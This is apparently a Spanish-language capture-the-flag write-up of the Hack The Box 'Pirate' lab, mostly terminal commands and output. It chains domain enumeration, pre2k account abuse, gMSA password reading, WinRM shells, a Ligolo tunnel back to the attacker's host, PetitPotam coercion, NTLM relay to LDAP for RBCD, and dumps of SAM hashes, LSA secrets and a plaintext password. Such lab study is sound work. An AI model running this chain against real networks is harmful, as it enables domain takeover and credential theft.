╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  cat hosts.txt | tee -a /etc/hosts
10.129.244.95     DC01.pirate.htb pirate.htb DC01

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  cp krb5.conf /etc/krb5.conf
```

Verificamos las credenciales proporcionadas.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb DC01.pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc ldap DC01.pirate.htb -u 'pentest' -p 'p3nt3st2025!&'
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

Tras ver que tenemos credenciales de LDAP, vamos a recolectar info del dominio `pirate.htb`.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  rusthound-ce -d pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -i 10.129.244.95 -f DC01.pirate.htb --ldaps --zip
---------------------------------------------------
Initializing RustHound-CE at 18:53:54 on 11/24/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-24T17:53:54Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-24T17:53:54Z INFO  rusthound_ce] Collection method: All
[2026-11-24T17:53:55Z INFO  rusthound_ce::ldap] Connected to PIRATE.HTB Active Directory!
[2026-11-24T17:53:55Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-11-24T17:53:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-24T17:53:58Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=pirate,DC=htb
[2026-11-24T17:53:58Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-24T17:54:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=pirate,DC=htb
[2026-11-24T17:54:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-24T17:54:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=pirate,DC=htb
[2026-11-24T17:54:35Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-24T17:54:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=pirate,DC=htb
[2026-11-24T17:54:35Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-24T17:54:36Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=pirate,DC=htb
[2026-11-24T17:54:36Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-11-24T17:54:36Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⢀ Parsing LDAP objects: 4%                                                                                                                                                                                       [2026-11-24T17:54:36Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
[2026-11-24T17:54:36Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 10 users parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 4 computers parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 75 containers parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-11-24T17:54:36Z INFO  rusthound_ce::json::maker::common] .//20261124185436_pirate-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 18:54:36 on 11/24/26! Happy Graphing!
```

![[Pasted image 20261124190249.png]]

Vemos un poco el estado del dominio. Al ver el grupo `PRE-WINDOWS 2000 COMPUTERS` podemos tratar de realizar el ataque `pre2k`, para adquirir el control de alguna cuenta de alguna máquina.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f() { faketime "$(ntpdate -q DC01.pirate.htb | cut -d ' ' -f 1,2)" "$@" }

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f nxc ldap DC01.pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k -k
LDAP        DC01.pirate.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP        DC01.pirate.htb 389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
PRE2K       DC01.pirate.htb 389    DC01             Pre-created computer account: MS01$
PRE2K       DC01.pirate.htb 389    DC01             Pre-created computer account: EXCH01$
PRE2K       DC01.pirate.htb 389    DC01             [+] Found 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K       DC01.pirate.htb 389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       DC01.pirate.htb 389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K       DC01.pirate.htb 389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache
```

Tras adquir las cuentas `MS01$` y `EXCH01$` revisamos las DACL que podemos abusar.
![[Pasted image 20261124190653.png]]


Para poder adquir una shell al sistema podemos abusar de ReadGMSAPassword.
>[!Info] 
>ReadGMSAPassword es un permiso de Active Directory que permite leer la contraseña administrada de una cuenta gMSA (Group Managed Service Account).
Si tienes ese permiso sobre una gMSA, puedes recuperar su contraseña y usarla para autenticarte como esa cuenta. Windows rota esa contraseña automáticamente, así que no suele ser una contraseña que el administrador cambie a mano.

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  export KRB5CCNAME=$(pwd)/ms01.ccache

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f bloodyAD --host DC01.pirate.htb -d pirate.htb -u 'MS01$' -k get object "CN=GMSA_ADCS_PROD,CN=MANAGED SERVICE ACCOUNTS,DC=PIRATE,DC=HTB" --attr msDS-ManagedPassword

distinguishedName: CN=GMSA_ADCS_PROD,CN=MANAGED SERVICE ACCOUNTS,DC=PIRATE,DC=HTB
msDS-ManagedPassword.NT: 1b8d03fd488dfb31f30271d734c4b516
msDS-ManagedPassword.B64ENCODED: p+D8B8Ep2btLYWNVi0UBBhBA/iQ5KK+SOG6tJwHJlp3xWmN6fjQ55OyY5fThkKYySgfEFRWA1bUJ427HR1goe6PClXRY2e658SZqdk5UVsDTY4QqqlLoykcn2huzRc0WCIhJXLTcrhII5TvWn6E9FThLwYfhkZWVKw2uz+oglS8taggKYeJfBYrcnmUAAhHfoh7MQdnX68sxJ9ptL3VzL8OWUPXdtUPcKvV2N92Pb30b1zgLaSG580oZk4c1GK8tE76Jvc0ZJCdFAzijwERNeo41LoV5Y2dqxvzfpj1YzRnzWxksceo8BIOFA1UhozqeURnmhtiwc+rHwVQKVK0Bng==

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f bloodyAD --host DC01.pirate.htb -d pirate.htb -u 'MS01$' -k get object "CN=GMSA_ADFS_PROD,CN=MANAGED SERVICE ACCOUNTS,DC=PIRATE,DC=HTB" --attr msDS-ManagedPassword

distinguishedName: CN=GMSA_ADFS_PROD,CN=MANAGED SERVICE ACCOUNTS,DC=PIRATE,DC=HTB
msDS-ManagedPassword.NT: a008939426f29c67d3002a16029ab145
msDS-ManagedPassword.B64ENCODED: VG+Z7r70EfDxbxif5YdtSLe9ks9DUxg+1KKxL4DxGbcGUlm1q6vyjGI4m5QK4zaCiSgdCy1jYQAwk15vmQbCexdCosx5ay6Gfy79uOpACaRrWT/DCM5LMBbCnopdk7IUJIxqvMAEGl39dU7ml3Im7ylwHY3EMJiWkgRunZa2NXpTrMZBmbnzAcdn43ofXGurPUVcF2gqWxzxawkX2WtLkBMf0/7x5Nka+gNWggU3bBjXezxMrkgd27T8p5o0Z74lSQCVBq/43Za0fnOZG5Wrr6okDh/VgBvQKzm9+ptfnN5Clrqpz4iy+mV7qvs0x4RdCCqYhGg/Y1TdsYpslSe8PQ==
```

Ahora comprobamos que podemos adquirir shell al sistema vía WinRm.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc winrm DC01.pirate.htb -u 'GMSA_ADCS_PROD$' -H '1b8d03fd488dfb31f30271d734c4b516'
WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\GMSA_ADCS_PROD$:1b8d03fd488dfb31f30271d734c4b516 (admin)

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc winrm DC01.pirate.htb -u 'GMSA_ADFS_PROD$' -H 'a008939426f29c67d3002a16029ab145'
WINRM       10.129.244.95   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)
WINRM       10.129.244.95   5985   DC01             [+] pirate.htb\GMSA_ADFS_PROD$:a008939426f29c67d3002a16029ab145 (admin)
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  evil-winrm -i DC01.pirate.htb -u 'GMSA_ADCS_PROD$' -H '1b8d03fd488dfb31f30271d734c4b516'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
/usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> whoami
pirate\gmsa_adcs_prod$

*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.244.95
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

Tras ver 2 interfaces de red, vamos a realizar un `Ping Swap` para tratar de identificar hosts.
```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> 1..254 | % { $ip="192.168.100.$_"; $p=New-Object Net.NetworkInformation.Ping; if ($p.Send($ip,300).Status -eq 'Success') { $ip } }
192.168.100.1
192.168.100.2
```

Ahora al ver otro host, vamos a realizar un pivoting con Ligolo
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  ip tuntap add user root mode tun ligolo

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  ip link set ligolo up

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  ip addr show ligolo
4: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500
    link/none
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  ./lin-proxy -selfcert -laddr 0.0.0.0:11601
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] daemon configuration file not found. Creating a new one...
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate
INFO[0002] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.8.3

ligolo-ng »
```

```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> .\win-agent.exe -connect 10.10.14.73:11601 -ignore-cert
win-agent.exe : time="2026-11-24T17:33:06-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-11-2...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-11-24T17:33:07-08:00" level=info msg="Connection established" addr="10.10.14.73:11601"
```

```sh
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> .\win-agent.exe -connect 10.10.14.73:11601 -ignore-cert
win-agent.exe : time="2026-11-24T17:33:06-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-11-2...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-11-24T17:33:07-08:00" level=info msg="Connection established" addr="10.10.14.73:11601"
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  ip route add 192.168.100.0/24 dev ligolo
```

Ahora verificamos que hay conectividad y terminamos de verificar que activos hay en la otra red.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb 192.168.100.0/24 --generate-hosts-file hosts2.txt
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:True) (SMBv1:None)
SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  cat hosts2.txt | tee -a /etc/hosts
192.168.100.2     WEB01.pirate.htb WEB01
192.168.100.1     DC01.pirate.htb pirate.htb DC01
```

Ahora con las crededenciales que tenemos, verificamos si tenemos acceso a `WEB01`.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc winrm WEB01.pirate.htb -u 'GMSA_ADFS_PROD$' -H 'a008939426f29c67d3002a16029ab145'
WINRM       192.168.100.2   5985   WEB01            [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb)
WINRM       192.168.100.2   5985   WEB01            [+] pirate.htb\GMSA_ADFS_PROD$:a008939426f29c67d3002a16029ab145 (admin)

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc winrm WEB01.pirate.htb -u 'GMSA_ADCS_PROD$' -H '1b8d03fd488dfb31f30271d734c4b516'
WINRM       192.168.100.2   5985   WEB01            [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb)
WINRM       192.168.100.2   5985   WEB01            [-] pirate.htb\GMSA_ADCS_PROD$:1b8d03fd488dfb31f30271d734c4b516
```

Una vez tenemos sesión rdp con `GMSA_ADFS_PROD$`, con `RunasCs.exe` revisaremos si hay sessiones activas de algún usuario. 
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  evil-winrm -i WEB01.pirate.htb -u 'GMSA_ADFS_PROD$' -H 'a008939426f29c67d3002a16029ab145'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
/usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents> .\RunasCs.exe whatever whatever qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           a.white                   1  Active
 31c5ce94259d4...                        65536  Listen
```

Vemos que el usuario `a.white` tiene sesión de terminal activa. Con esto, podemos intentarcapturar algun NTLM.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb WEB01.pirate.htb -u 'GMSA_ADCS_PROD$' -H '1b8d03fd488dfb31f30271d734c4b516' -M coerce_plus -o LISTENER=10.10.14.73
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:True) (SMBv1:None)
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\GMSA_ADCS_PROD$:1b8d03fd488dfb31f30271d734c4b516
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PetitPotam
COERCE_PLUS 192.168.100.2   445    WEB01            Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PrinterBug
COERCE_PLUS 192.168.100.2   445    WEB01            Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, MSEven
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.73]
    Responder IPv6             [dead:beef:2::1047]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-RV2LMVFYQ1I]
    Responder Domain Name      [HLXU.LOCAL]
    Responder DCE-RPC Port     [47234]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv1-SSP Client   : 10.129.244.95
[SMB] NTLMv1-SSP Username : PIRATE\WEB01$
[SMB] NTLMv1-SSP Hash     : WEB01$::PIRATE:A5BAECED82564D9300000000000000000000000000000000:8DE4C98ED90EC52D176F06218FF4F870C693EFFC266E594D:1122334455667788
[*] Skipping previously captured hash for PIRATE\WEB01$
[*] Skipping previously captured hash for PIRATE\WEB01$
```

El NTLM que se ha capturado es un `NTLMv1`, y de la máquina de la cuenta, por lo que a nosostros nos interesa la de `a.white`.

La salida confirma que WEB01 intentó autenticarse hacia tu equipo como PIRATE\WEB01$. PetitPotam y PrinterBug lograron disparar la conexión; Skipping previously captured hash indica que Responder ya había guardado esa misma respuesta. coerce_plus fuerza la conexión, mientras que Responder aquí la está capturando: todavía no es un relay.

Para poder escalar esto, podemos intentar usar la autenticación de WEB01$ para configurar RBCD en LDAP, luego obtener control de WEB01 y desde allí recuperar la credencial de a.white.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb WEB01.pirate.htb -u 'GMSA_ADCS_PROD$' -H '1b8d03fd488dfb31f30271d734c4b516' -M coerce_plus -o LISTENER=10.10.14.73
SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:True) (SMBv1:None)
SMB         192.168.100.2   445    WEB01            [+] pirate.htb\GMSA_ADCS_PROD$:1b8d03fd488dfb31f30271d734c4b516
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PetitPotam
COERCE_PLUS 192.168.100.2   445    WEB01            Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 192.168.100.2   445    WEB01            VULNERABLE, PrinterBug
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  ntlmrelayx.py -t ldap://DC01.pirate.htb -smb2support -i --remove-mic
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client WINRMS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.244.95, attacking target ldap://DC01.pirate.htb
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://DC01.pirate.htb SUCCEED [1]
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as PIRATE/WEB01$
```

Configuramos la delegación de tipo RBCD (Resource Based Contrained Delegation)
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nc 127.0.0.1 11000
Type help for list of commands

# set_rbcd WEB01$ gMSA_ADFS_prod$
Found Target DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb
Target SID: S-1-5-21-4107424128-4158083573-1300325248-3102

Found Grantee DN: CN=gMSA_ADFS_prod,CN=Managed Service Accounts,DC=pirate,DC=htb
Grantee SID: S-1-5-21-4107424128-4158083573-1300325248-4108
Delegation rights modified successfully!
gMSA_ADFS_prod$ can now impersonate users on WEB01$ via S4U2Proxy
```

Ahora vamos a impersonar el Administrator de servidor WEB01, para traernos la SAM y los secretos LSA.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'a008939426f29c67d3002a16029ab145' -k --delegate Administrator --lsa --sam
SMB         WEB01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:True) (SMBv1:None)
SMB         WEB01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator through S4U with gMSA_ADFS_prod$ (admin)
SMB         WEB01.pirate.htb 445    WEB01            [*] Dumping SAM hashes
SMB         WEB01.pirate.htb 445    WEB01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
SMB         WEB01.pirate.htb 445    WEB01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         WEB01.pirate.htb 445    WEB01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         WEB01.pirate.htb 445    WEB01            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
SMB         WEB01.pirate.htb 445    WEB01            [+] Added 4 SAM hashes to the database
SMB         WEB01.pirate.htb 445    WEB01            [*] Dumping LSA secrets
SMB         WEB01.pirate.htb 445    WEB01            PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09)
SMB         WEB01.pirate.htb 445    WEB01            PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-11-25 00:37:33)
SMB         WEB01.pirate.htb 445    WEB01            PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-11-25 00:35:32)
SMB         WEB01.pirate.htb 445    WEB01            PIRATE\WEB01$:aes256-cts-hmac-sha1-96:57b48ef53425adf16b2409ea4d980de1007c9f61b126bdc1c05d3d830c727526
SMB         WEB01.pirate.htb 445    WEB01            PIRATE\WEB01$:aes128-cts-hmac-sha1-96:b6b018d4edd476f0999d6f666844cf77
SMB         WEB01.pirate.htb 445    WEB01            PIRATE\WEB01$:des-cbc-md5:efdf97b9a1e06243
SMB         WEB01.pirate.htb 445    WEB01            PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
SMB         WEB01.pirate.htb 445    WEB01            PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
SMB         WEB01.pirate.htb 445    WEB01            PIRATE\a.white:E2nvAOKSz5Xz2MJu
SMB         WEB01.pirate.htb 445    WEB01            dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
SMB         WEB01.pirate.htb 445    WEB01            _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
